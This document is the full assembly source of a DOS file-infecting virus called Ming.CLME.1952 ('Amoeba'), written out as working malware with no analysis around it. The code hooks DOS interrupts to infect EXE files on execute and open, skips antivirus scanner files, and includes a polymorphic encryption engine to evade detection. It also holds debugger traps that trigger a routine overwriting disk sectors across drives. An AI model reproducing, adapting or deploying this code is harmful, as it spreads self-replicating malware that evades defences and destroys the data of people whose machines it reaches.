;---------------------------------------------------------------------------;
; Title: Ming.CLME.1952							    ;
; (c) 1996    Malware Technology                                            ;
; Disclaimer: Malware Technology is not responsible for any problems        ;
;             caused due to assembly of this source.                        ;
;---------------------------------------------------------------------------;
.radix 10h
.model small
.code
.386

assume	cs:_TEXT,ds:_TEXT,ss:_TEXT

start:
	call	flex2
flex2:
	pop     si
;       sub     si, offset flex2 - offset start 
	db	81,0EE
	dw	offset flex2 - offset start

        xor     ax,ax
        mov	ds,ax			; DS := 0

	; Debugger Trap I
        mov	ax,cs
        shl	eax,10			; Put segment into upper 16bit of eax
        lea	ax,newint01[si]
        xchg	eax,dword ptr ds:[4]	; int 01 vector
	mov	dword ptr ds:[4],eax

	; Debugger Trap II
        ; make a checksum over the virus
        mov	al,0
        mov	bx,si
        mov	cx,19bh
checksum_loop:
        add	al,byte ptr cs:[bx]
        inc	bx
        loop	checksum_loop
        cmp	al,byte ptr cs:checksum[si]
        jne	newint01

        cli
        dec	sp
        sti

        push	es
        mov	ah,0f2
        int	21			; self-check
        cmp	ah,2			; i am resident ?
        jnz	not_resident		; no

        call	flex3
flex3:
	pop	ax
        sub	ax,offset flex3 - offset start
        xchg	bp,ax
        push	cs
        pop	ds			; DS := CS
        push	cs
        pop	es			; ES := CS
        lea	si,initial_regs[bp]
        lea	di,old_ip[bp]
        cld
        mov	cx,8
        rep	movsb
        pop	es			; PSP segment
        push	es
	mov	ax,es
        add	ax,10
        add	cs:old_cs[bp],ax
        add	cs:old_ss[bp],ax
        mov	ah,2ch
	int	21			; Get Time
        cmp	dh,2			; Seconds = 2 ?
	jnz	no_damage		; No

        ; Damage function
        push	bp
        mov	ah,3
        mov	bh,0
        int	10			; Get Cursor Position at Page 0
	push	cx			; and save it
        push	dx
	mov	ax,1301			; Give out string
	mov	dx,0800			; (8,0)
        push	cs
        pop	es			; ES := CS
        lea	bp,copyright[bp]	; adress of string
        mov	bl,0f0			; Attributes
	mov	cx,offset end_copyright - offset copyright
					; Length of String
        int	10			; now
        mov	ah,2			; set cursor position
        pop	dx			; get from stack
        pop	cx
        int	10
        pop	bp
	mov	cx,0b6
        sti
stop_loop:
        hlt
        loop	stop_loop

no_damage:
	pop	es			; PSP segment
        push	es
        pop	ds
        cli
        mov	ss,word ptr cs:old_ss[bp]
        mov	sp,word ptr cs:old_sp[bp]
	sti
        jmp	start_host

not_resident:
	call	flex4
flex4:
	pop	si
        sub	si,offset flex4 - offset start
        pop	ax			; PSP-segment
        add	ax,10
        mov	es,ax			; Segment after PSP
        push	es
        xor	ax,ax
        xchg	di,ax
        mov	ds,ax			; DS := 0

        ; Debugger Trap III
        mov	eax,0CBA4F3FC		; CLD; REPZ; MOVSB; RETF
        xchg	eax,dword ptr ds:[000C]
        mov	cs:oldint03[si],eax
        mov	ax,offset start_over
        push	ax
        mov	cx,offset virus_end - offset start	; size of whole virus
        push	cs
        pop	ds
        		; DS:SI - begin of virus
                        ; ES:DI	- right after PSP
                        ; return adress on stack ES:00E5
        db	0EA
        dd	0000000Ch		; JMP FAR 0000:000C


start_over:
	xor	ax,ax
        mov	ds,ax			; DS := 0
        mov	ax,cs
        shl	eax,10
        mov	ax,offset newint21
        xchg	eax,dword ptr ds:[84]	; Set new int 21
	mov	cs:oldint21,eax		; and save old one
        mov	eax,oldint03
        mov	dword ptr ds:[200],eax	; Set int 80 to int 03

        ; Get name of started program
        push	cs
        pop	ax
        sub	ax,10			; => PSP segment
        mov	ds,ax
        mov	es,ax
        mov	ax,word ptr ds:[2c]	; segment of enviroment
	mov	ds,ax
        mov	bx,0ffff
env_loop:
        inc	bx
        cmp	word ptr ds:[bx],0
        jnz	env_loop
        cmp	word ptr ds:[bx+2],1
        jnz	env_loop
	add	bx,4

        mov	dx,bx
        mov	bx,offset exec_param_buffer
        mov	word ptr cs:[bx+4],es		; segment of command string
        mov	word ptr cs:[bx+8],es		; segment of 1st FCB
        mov	word ptr cs:[bx+0c],es		; segment of 2nd FCB

	push	ds
        push	es
	xor	ax,ax
        mov	es,ax			; ES := 0
        lds	bx,dword ptr es:[0C1]		; ???
        cmp	word ptr ds:[bx],9090
        jnz	@@103
        mov	bx,[bx+8]
        lds	bx,dword ptr ds:[bx]
@@103:
	mov	cx,25
	add	bx,cx
@@105:
        inc	bx
        cmp	word ptr [bx],0FC80
        jnz	@@104
        mov	ax,bx
@@104:
	loop	@@105

        mov	di,offset tunneled_int21
        push	cs
        pop	es
        cld
        stosw
        mov	ax,ds
        stosw

        pop	ax
        push	ax
        dec	ax
        mov	ds,ax
        mov	dword ptr ds:[8],656F6D41
        mov	dword ptr ds:[0C],315F6162

        pop	es
        pop	ds

        mov	ah,4ah
        mov	bx,1000				; virus needs 64 kbyte !
        int	21

        mov	ax,4b00
        push	cs
        pop	es
        mov	bx,offset exec_param_buffer
        int	21
        mov	ah,4dh
        int	21				; get ERRORLEVEL
        mov	ah,31
        mov	dx,0200
        call    call_int21

        ; Exec-Param-Block
exec_param_buffer         dw    ?       ; segment of enviroment
                          dw    0080    ; offset  of command string
                          dw    ?       ; segment of command string
                          dw    005C    ; offset  of 1st FCB
                          dw    ?       ; segment of 1st FCB
                          dw    006C    ; offset  of 2nd FCB
                          dw    ?       ; segment of 2nd FCB

copyright	db	'      *Amoeba v1.00*        ',0ah,0dh
		db	'Written by Crazy Lord (Ming)',0ah,0dh
		db	'     Made in Hong Kong      '
end_copyright	equ	$


newint01:
	call	tunnel_int13
        xor	ax,ax
        mov	ds,ax			; DS := 0
        mov	ah,19
        int	21			; get actual drive
        xchg	al,dl			; drive number into dl
        mov	dh,0			; Head 0
        mov	cx,1			; Track 0 Sector 1
trash_next_track:
        mov	ax,301			; Write one sector
        pushf
        call	dword ptr ds:[004ch]	; call int 13h
        inc	ch			; next Track
        cmp	ch,22
	jnz	trash_next_track
        inc	dl			; next drive
	jmp	trash_next_track


newint21:
	pushf
        cmp	ah,0f2
        jnz	not_selfcheck
        mov	ah,2
        popf
        iret
not_selfcheck:
	cmp	ax,4b00
        jz	infect_file
        cmp	ah,3dh
        jz	infect_file
        cmp	ah,56
        jz	infect_file
        cmp	ah,43
        jz	infect_file

go_old21:
	popf
		db	0EA	; JMP FAR xxxx:xxxx
oldint21	dd	?		; (0246)

infect_file:
	pusha
        mov	bx,dx
        dec	bx
next_char:
	inc	bx
        cmp	byte ptr ds:[bx],0	; end of string ?
        jnz	next_char
        cmp	word ptr ds:[bx-2],'EX'	; EXE-file ?
        jz	is_exe
do_not:
        popa
        jmp	go_old21

is_exe:
	cmp	word ptr ds:[bx-6],'NA'	; 'TBSCAN.EXE' ?
        jz	do_not
	cmp	word ptr ds:[bx-6],'TO'	; 'F-PROT.EXE' ?
        jz	do_not
	cmp	word ptr ds:[bx-6],'86'
        jz	do_not
	cmp	word ptr ds:[bx-6],'YP'
        jz	do_not
	cmp	word ptr ds:[bx-6],'GE'
;*	jz	do_not

	push	ds
        push	es
        call    tunnel_int13

        mov	ax,3d02
        call	call_int21			; open file for read/write
        xchg	bx,ax

        mov	ax,5700
        call	call_int21			; get files date & time
        push	dx			; and save them
        push	cx

        or	cx,0FFF0
        cmp	cx,0FFFF		; seconds = 30 or 62 ?
        jnz	do_infect

        pop	cx
        pop	dx
        jmp	close_file

do_infect:
	push	cs
        pop	ds

        mov	ah,3f
        mov	cx,18
        mov	dx,offset buffer
        call	call_int21			; read 24 byte from file

        push	cx
        push	dx

        les	ax,dword ptr buffer[0E]
        mov	word ptr initial_regs[4],ax
        mov	word ptr initial_regs[6],es
        les	ax,dword ptr buffer[14]
        mov	word ptr initial_regs,ax
        mov	word ptr initial_regs[2],es

        mov	ax,4202
        xor	cx,cx
        cwd
        call	call_int21			; seek to end of file

        push	dx			; filesize
        push	ax
        push	bx			; file handle

        mov	bx,word ptr buffer[8]
        shl	bx,4			; *16
        sub	ax,bx
        sbb	dx,0
        mov	bx,10
        div	bx
        mov	word ptr buffer[16],ax
        add	ax,100
        mov	word ptr buffer[0E],ax
        mov	word ptr buffer[14],dx
	mov	word ptr buffer[10],0

        mov	cs:int_ss,ss
        mov	cs:int_sp,sp

        mov	ax,cs
        cli
        mov	ss,ax
        mov	sp,offset own_stack
        sti

        mov	ax,cs
        mov	bx,offset virus_end + 50
        shr	bx,4
        add	ax,bx
        mov	es,ax
        mov	bp,dx
        mov	dx,0
        mov	cx,offset virus_end
        call	mutate

        cli
        mov	sp,cs:int_sp
        mov	ss,cs:int_ss
        sti

        pop	bx			; file handle
        mov	ah,40
        cwd
        call    call_int21			; append virus to file

        push	cs
        pop	ds
        pop	ax			; filesize
        pop	dx
        add	ax,cx
        adc	dx,0
        push	bx
        mov	bx,0200
        div	bx			; => size in pages
        mov	word ptr buffer[2],dx
        or	dx,dx
        jz	last_page_full
	inc	ax
last_page_full:
        mov	word ptr buffer[4],ax

        mov	ax,4200
        pop	bx
        xor	cx,cx
        cwd
        call	call_int21			; seek to top of file

        mov	ah,40
        pop	dx
        pop	cx
        call	call_int21			; write new header to file

        mov	ax,5701
        pop	cx
        pop	dx
        or	cx,0F
        call	call_int21			; set modified time

close_file:
        mov	ah,3e
	call	call_int21			; close file

	mov	ah,0dh
        int	21			; reset all drives

        xor	ax,ax
        mov	ds,ax			; DS := 0
        mov	ax,word ptr cs:oldint13
        mov	word ptr ds:[4c],ax
        mov	ax,word ptr cs:oldint13+2
        mov	word ptr ds:[4e],ax

        pop	es
        pop	ds
        popa
        jmp     go_old21


call_int21:
        pushf

        db	09A	; CALL FAR xxxx:xxxx
tunneled_int21	dd	?

	ret

tunnel_int13:
	pusha
        push	ds
        push	es
        xor	bx,bx
        mov	es,bx			; ES := 0
        mov	ax,0F000
        mov	ds,ax			; DS := 0F000
search_loop:
        inc	bx
        cmp	dword ptr ds:[bx],0FB80FA80
        jnz	search_loop
        mov	ax,ds
        shl	eax,10
        xchg	bx,ax
        xchg	eax,dword ptr es:[004c]		; set new int 13
        mov	dword ptr cs:oldint13,eax	; save old int 13
        pop	es
        pop	ds
        popa
        ret

start_host:
	db      0EA                     ; JMP FAR
old_ip  dw      ?
old_cs	dw	?                   
old_ss	dw	?
old_sp	dw	?                     

oldint13	dd	?
oldint03	dd	?

initial_regs	dw	?
		dw	?
		dw	?
		dw	?


checksum        db	06F

buffer		db	18 dup (?)


int_sp		dw	?
int_ss		dw	?

        db	28 dup (?)

own_stack:
	db	9 dup (?)


; Input:
;    CX - byte to crypt
;    DS:DX - pointer to ccode to crypt (DS must be equal to CS!)
;    ES - working segment
;    BP - offset the deryptor should run on later
; Output:
;    CX - byte in encrypted code and decryptor
;    DS:DX - pointer to decryptor end encr. code
mutate:
	jmp	start2

	db	'CLME V0.62'

start2:
	push	ax
	push	bx
	push	si
	push	di
	xchg	bp,ax
	; get offset the engine runs on
	call	flex1
flex1:
	pop	bp
	sub	bp,offset flex1
	; save parameters
	mov	o_es[bp],es
	mov	o_ds[bp],ds
	mov	o_dx[bp],dx
	mov	o_cx[bp],cx
	mov	o_ax[bp],ax
	; init the engine
	xor	di,di		; it begins at ES:0 to create the decryptor
	mov	step_count[bp],0	; begin with step 0
	mov	int_allready[bp],0	; no int 8/1c generated yet
next_round:
	;
	call	rnd_get
	mov	bl,12		; random values 0..E
	call	rnd_limited
	xor	ah,ah
        xchg	cx,ax
        jcxz	next_round		; 0 not allowed
        cmp	step_count[bp],2
	ja	after_step_2
	add	cx,10		; up to step 2 use more junk
after_step_2:
	cmp	step_count[bp],6	; before last step ?
	jz	step_6			; yes
        call	rnd_get
        mov	bl,33			; random value from 0..5
        call	rnd_limited
        cmp	al,5
        jz      case_1
        cmp	al,4
        jz	case_2
        cmp	al,3
        jz	case_3
        cmp	al,2
        jz	case_4
        cmp	al,1
        jz      case_5
        ; generate a int 8/1c
        cmp	di,10		; within the first 16 byte ?
        jb	do_not_gen_int		; yes then do not generate
	cmp	int_allready[bp],1	; allready generated such a int ?
        jz	do_not_gen_int		; yes then do not generate
        mov	int_allready[bp],1	; set flag
        mov	al,0cdh		; INT
	stosb
        call	rnd_get
        and	ax,1
        or	al,al
        jz	int_1c		; take INT 1c
        mov	al,8		; take int 8
        jmp	int_both
int_1c:
	mov	al,1c
int_both:
	stosb			; put the int number
					;org	98
do_not_gen_int:
	loop    after_step_2
        jmp	junk_done
					;org	9C
case_5:
	call	junk1
        jmp	do_not_gen_int
        				;org	0A1
case_1:
	call	junk2
        jmp	do_not_gen_int
					;org	0A6
case_2:
	call	junk3
        jmp	do_not_gen_int
					;org	0AB
case_3:
	call	junk4
        jmp	do_not_gen_int
					;org	0B0
case_4:
	call	junk5
        jmp	do_not_gen_int
					;org	0B5
step_6:
	call	junk6
        loop	after_step_2
	jmp	not_step_4
					;org	0BC
junk_done:
	cmp	step_count[bp],0
        jnz	not_step_0
	; Init Address
	mov	pos_addrinit[bp],di		; save position
        inc	step_count[bp]
        lea	si,mov_ax[bp]		; MOV AX opcode
        cld
        movsb
        movsw				; put it
        jmp     next_round
not_step_0:
	cmp	step_count[bp],1
        jnz	not_step_1
	; Init encryption value
        mov	pos_encrinit[bp],di		; save position
        inc	step_count[bp]
        lea	si,mov_al[bp]		; MOV AL opcode
        cld
        movsw				; put it
        jmp	next_round
not_step_1:
        cmp	step_count[bp],2
        jnz	not_step_2
	; make encryption
        mov	pos_encrypt[bp],di
        inc	step_count[bp]
        lea	si,xor_opcode[bp]
	cld
        movsb
        movsw
        jmp	next_round
not_step_2:
        cmp	step_count[bp],3
        jnz	not_step_3
	; make encryption value modifier
        mov	pos_modif[bp],di		; save postion
        inc	step_count[bp]
        lea	si,add_al[bp]		; ADD AL opcode
        cld
        movsw
        jmp	next_round
not_step_3:
        cmp	step_count[bp],4
        jnz	not_step_4
	; make address increase
        mov	pos_increase[bp],di		; save position
        inc	step_count[bp]
        lea	si,inc_ax[bp]		; INC AX opcode
        cld
        movsb
	jmp	next_round

not_step_4:
	cmp	step_count[bp],5
        jnz	not_step_5
	; make address compare
        mov	pos_addrcmp[bp],di		; save position
        inc	step_count[bp]
        lea	si,cmp_ax[bp]		; CMP AX,value opcode
        cld
        movsw
        movsw
        jmp	next_round

not_step_5:
	; end decryptor with JNZ
	mov	pos_loopjmp[bp],di
        lea	si,jnonz[bp]		; JNZ (backwards to begin of loop)
	cld
        movsw				; put it
	; choose encryption value
        call	rnd_get
        mov	encr_val[bp],al
	; and put it into the opcode with initializises it
	mov	di,pos_encrinit[bp]
        inc	di
        cld
        stosb
	;
        call	choose_addrreg
        mov	di,pos_addrinit[bp]
        add	byte ptr es:[di],al
        mov	di,pos_increase[bp]
        add	byte ptr es:[di],al
 	mov	di,pos_addrcmp[bp]
        inc	di
        add	byte ptr es:[di],al
	mov	di,pos_encrypt[bp]
        inc	di
        inc	di
        cmp	al,3
        jnz	is_not_bx
        add	byte ptr es:[di],9
        jmp	zero_encryption_value
is_not_bx:
        add	byte ptr es:[di],al
zero_encryption_value:
	; choose the value for the encryption modifying
	call	rnd_get
        or	al,al
        jz	zero_encryption_value
        mov	modif_val[bp],al
	; insert it into the modifier opcode
        mov	di,pos_modif[bp]
        inc	di
        mov	byte ptr es:[di],al
	; fix the address in the address init
        mov	di,pos_addrinit[bp]
        inc	di
        mov	ax,pos_loopjmp[bp]
        inc	ax
        inc	ax
        add	ax,o_ax[bp]
        stosw
	; fix the address in the address compare
        mov	di,pos_addrcmp[bp]
        inc	di
        inc	di
        add	ax,o_cx[bp]
        inc	ax
        stosw
	; fix the jnz that makes the loop
        mov	di,pos_loopjmp[bp]
        mov	ax,pos_encrypt[bp]
        sub	ax,di
        dec	ax
        dec	ax
        inc	di
        stosw		; stores as word but higher byte will be overwritten
	; copy the code to crypt after the decryptor
        mov	ds,o_ds[bp]
        mov	si,o_dx[bp]
        mov	di,pos_loopjmp[bp]
        inc	di
        inc	di
        mov	cx,o_cx[bp]
        cld
        rep	movsb
	; encrypt the whole stuff
        mov	al,encr_val[bp]
        mov	di,pos_loopjmp[bp]
        inc	di
        inc	di
        mov	cx,o_cx[bp]
        mov	ah,modif_val[bp]
encryption_loop:
        xor	es:[di],al
        inc	di
        add	al,ah
        loop	encryption_loop
	; calculate result values
        mov	cx,pos_loopjmp[bp]
        inc	cx
        inc	cx
        add	cx,o_cx[bp]
        push	es
        pop	ds
        xor	dx,dx
	; leave the engine
        pop	di
        pop	si
        pop	bx
        pop	ax
	ret

						;org	212
junk1:
	push	cx
        call	rnd_get
        push	bx
        mov	bl,1c			; random value 0..9
        call    rnd_limited
        pop	bx
        lea	bx,junk_table[bp]
        xor	ah,ah
        add	bx,ax			; index in thhe table
        mov	al,byte ptr ds:[bx]	; get opcode
        cld
        stosb				; put it
        ; add second byte
        call	choose_reg8
        xchg	al,bl
        mov	cl,3
        shl	bl,cl
        call	choose_reg8
        add	al,bl
        add	al,0C0
        cld
	stosb
        pop	cx
        ret

					;org	23Dh
junk2:
	push	cx
        call	rnd_get
	push	bx
	mov	bl,1c			; random value 0..9
	call	rnd_limited
	pop	bx
	lea	bx,junk_table[bp]
        xor	ah,ah
        add	bx,ax
        mov	al,byte ptr ds:[bx]	; get opcode
        inc	al			; make it a word operation
        cld
        stosb				; put it
        call	choose_reg16
        xchg	al,bl
        mov	cl,3
        shl	bl,cl
        call	choose_reg16
        add	al,bl
        add	al,0C0
        cld
        stosb				; put second byte
        pop	cx
	ret

					;org	26A
junk3:
	mov	al,80		; prefix 80
        jmp     prefix_junk
					;org	26E
junk4:
	mov	al,81		; prefix 81
        jmp	prefix_junk
					;org	272
junk5:
	mov	al,83		; prefix 83
        jmp	prefix_junk
					;org	276
prefix_junk:
	push	cx
        cld
        stosb			; put the prefix
        xor	ah,ah
        xchg	al,dl		; save prefix to DL
        call	rnd_get
        mov	bl,24
        call	rnd_limited	; random value 0..7
        mov	cl,3
        shl	al,cl
        add	al,0c0
        xchg	al,bl		; save to bl
        cmp	dl,80		; prefix was 80 ?
        jnz	its_word_register		; no then word reg
        call	choose_reg8
        jmp	reg_choosen
its_word_register:
	call    choose_reg16
reg_choosen:
	add	al,bl		; add to previous calculated
        cld
        stosb			; put it
        call	rnd_get
        cmp	dl,81		; was prefix 81 ?
        jz	put_word_data		; then put word data
        cld
        stosb			; put data
        jmp	putted_data
put_word_data:
	cld
        stosw			; put data
putted_data:
	pop	cx
        ret
						;org	2AE
junk6:
	push	cx
        call	rnd_get
        and	al,1
        lea	bx,junk_part[bp]
        xor	ah,ah
        add	bx,ax
        mov	al,byte ptr ds:[bx]		; get opcode
        cld
        stosb					; put it
        call	choose_reg16		; insert regs into second byte
        xchg	al,bl
        mov	cl,3
        shl	bl,cl
        call	choose_reg16
        add	al,bl
        add	al,0c0
        cld
        stosb				; put it
        pop	cx
	ret

						;org	2D4
        ; Get a random value in AX
rnd_get:
	push	bx
        push	cx
	lea	bx,last_rnd[bp]
        in	al,40
        xchg	al,cl
        in	al,40
        xchg	al,ah
        in	al,40
assume	ds:nothing
	add	ax,word ptr cs:[bx]
        rol	ax,cl
        mov	word ptr cs:[bx],ax
assume	ds:_TEXT
	pop	cx
        pop	bx
        ret

        ; 2ef
rnd_limited:
	; limited random number
	; 0...FFh/BL
	push	dx
        xor	dx,dx
        call	rnd_get
        mov	ah,0
        div	bl
        pop	dx
        ret
        ; 2fb

choose_addrreg:
	call	rnd_get
        push	bx
        mov	bl,24
        call	rnd_limited
        pop	bx
        cmp	al,3
        jz	adress_reg_choosen			; BX is ok
        cmp	al,6
        jb	choose_addrreg		; only ok for SI,DI
adress_reg_choosen:
	ret

;        org	30e
choose_reg8:
	call	rnd_get
        push	bx
        mov	bl,24			; random value 0..7
        call	rnd_limited
        pop	bx
        or	al,al
        jz	choose_reg8		; 0 not allowed (AL)
        cmp	al,3
        jz	choose_reg8		; 3 not ok (BL)
        cmp	al,7
        jz	choose_reg8		; 7 not ok (BH)
        ret

					;org	325
choose_reg16:
	call	rnd_get
        push	bx
        mov	bl,24			; random value 0..7
        call	rnd_limited
        pop	bx
        or	al,al			; 0 not ok (AX)
        jz	choose_reg16
        cmp	al,3			; 3 not ok (BX)
        jz	choose_reg16
        cmp	al,4			; 4 not ok (SP)
        jz	choose_reg16
        cmp	al,6			; 6,7 not ok (SI,DI)
        jnb	choose_reg16
        ret


modif_val	db	?
encr_val	db	?
last_rnd	dw	?
step_count	db	?
int_allready	db	?
o_es		dw	?
o_ds		dw	?
o_dx		dw	?
o_cx		dw	?
o_ax		dw	?
pos_addrinit	dw	?
pos_encrinit	dw	?
pos_encrypt	dw	?
pos_modif	dw	?
pos_increase	dw	?
pos_addrcmp    	dw	?
pos_loopjmp    	dw	?

		db	0C0			;*
junk_table	db	0,8,10,18,20,28,30,84
junk_part	db	86,88		; XCHG, MOV
mov_ax		db	0B8,0,0		; MOV AX,0
mov_al		db	0B0,0		; MOV AL,0
xor_opcode	db	2E,30,0FE	; XOR BYTE PTR CS:[reg16],reg8
add_al		db	4,0		; ADD AL,0
inc_ax		db	40		; INC AX
cmp_ax		db	81,0F8,0,0	; CMP AX,0
jnonz		db	75,1E		; JNZ

virus_end	equ	$

end start
